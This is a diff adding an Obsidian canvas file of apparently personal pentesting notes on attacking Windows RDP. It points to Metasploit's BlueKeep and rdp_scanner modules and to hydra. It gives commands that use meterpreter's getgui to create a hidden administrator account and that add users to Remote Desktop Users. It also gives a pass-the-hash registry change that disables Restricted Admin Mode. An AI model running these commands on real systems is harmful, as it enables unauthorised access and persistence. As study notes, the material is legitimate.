@@ -1,0 +1,23 @@
+{
+	"nodes":[
+		{"id":"d0145ae91348aae2","type":"group","x":-660,"y":-394,"width":520,"height":190,"label":"$ msf"},
+		{"id":"a292103bdfa6f154","type":"text","text":"# RDP (T:3389)\nRemote Desktop Protocol - Proprietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system.","x":-1180,"y":-294,"width":400,"height":180},
+		{"id":"a7b569fd8e91abf1","type":"text","text":"# $ msf - BlueKeep(vulnerability)","x":-640,"y":-314,"width":460,"height":100},
+		{"id":"bc66748a510f1f92","type":"text","text":"# $ msf - rdp_scanner","x":-640,"y":-374,"width":340,"height":60},
+		{"id":"abb1800ad29c8936","type":"file","file":"NOTES/99. TOOLS/hydra/hydra_rdp.md","x":-640,"y":-840,"width":800,"height":300},
+		{"id":"b62efe45db652312","type":"text","text":"# enable RDP\n```bash\nmeterpreter> run getgui\nmeterpreter>run getgui -e -u alice -p hack_123321\n```\nThe `getgui` command makes the below changes to the target machine:\n- Enable RDP service if it’s disabled\n- Creates new user for an attacker\n- Hide user from Windows Login screen\n- Adding created user to \"Remote Desktop Users\" and \"Administrators\" groups\n# add user to Remote Desktop Users group\nEnabling RDP on the machine is not all. If the target user (the one we know the credentials for) is not allowed to connect through RDP, we will have to grant him this privilege by adding him to the Remote Desktop Users group. Moreover we have to be sure that the Windows firewall does not block the connections.\n```Powershell\ncmd> net localgroup \"Remote Desktop Users\" <user> /add\n```\n# \n```bash\n# loowanie przez RDP do utworzonego konta\nxfreerdp /u:alice /p:hack_123321 /v:10.0.23.139\ny [Accept the certificate]\n```","x":-2200,"y":413,"width":954,"height":705},
+		{"id":"739485e605fdd0a3","type":"text","text":"# $ remmina\nGUI program","x":-630,"y":280,"width":580,"height":133},
+		{"id":"e75a3f0e73aeb7b0","type":"file","file":"NOTES/99. TOOLS/xfreerdp/xfreerdp.md","x":-640,"y":480,"width":1180,"height":434},
+		{"id":"772ec7b1a45dcfc8","type":"text","text":"# $ rdesktop\n```bash\n$ rdesktop <IP> –u <user> –p <passwd> [-r disk:tmp=$(pwd)]\n```","x":-640,"y":934,"width":580,"height":133},
+		{"id":"d002229a5227ae22","type":"text","text":"# Restricted Admin Mode\nRestricted Admin Mode is disabled by default and will prevent you from signing in with an NT hash:\n```powershell\n# https://medium.com/@jakemcgreevy/pass-the-hash-pth-with-rdp-80595fb38bef\n$ nxc smb 192.168.0.1 -u \"username\" -H \"NT_HASH\" -x 'reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'\n\n# https://www.stationx.net/pass-the-hash-attack/\n# Disable Restricted Acces if enabled to access host via RDP\n$ reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n```","x":-2560,"y":-374,"width":980,"height":372}
+	],
+	"edges":[
+		{"id":"68a62d4f0be2c1ca","fromNode":"a292103bdfa6f154","fromSide":"right","toNode":"d0145ae91348aae2","toSide":"left","label":"$ msf"},
+		{"id":"e3edfa24f2e90164","fromNode":"a292103bdfa6f154","fromSide":"bottom","toNode":"e75a3f0e73aeb7b0","toSide":"left","label":"$ xfreerdp"},
+		{"id":"9dea15c6eafd0545","fromNode":"a292103bdfa6f154","fromSide":"right","toNode":"abb1800ad29c8936","toSide":"left","label":"$ hydra"},
+		{"id":"2267d9fe0623054f","fromNode":"a292103bdfa6f154","fromSide":"bottom","toNode":"772ec7b1a45dcfc8","toSide":"left"},
+		{"id":"13d25f34c92b6738","fromNode":"a292103bdfa6f154","fromSide":"left","toNode":"b62efe45db652312","toSide":"top"},
+		{"id":"75bf03444b8ce01a","fromNode":"a292103bdfa6f154","fromSide":"bottom","toNode":"739485e605fdd0a3","toSide":"left"},
+		{"id":"75c5b95e00c0bfbd","fromNode":"a292103bdfa6f154","fromSide":"left","toNode":"d002229a5227ae22","toSide":"right"}
+	]
+}
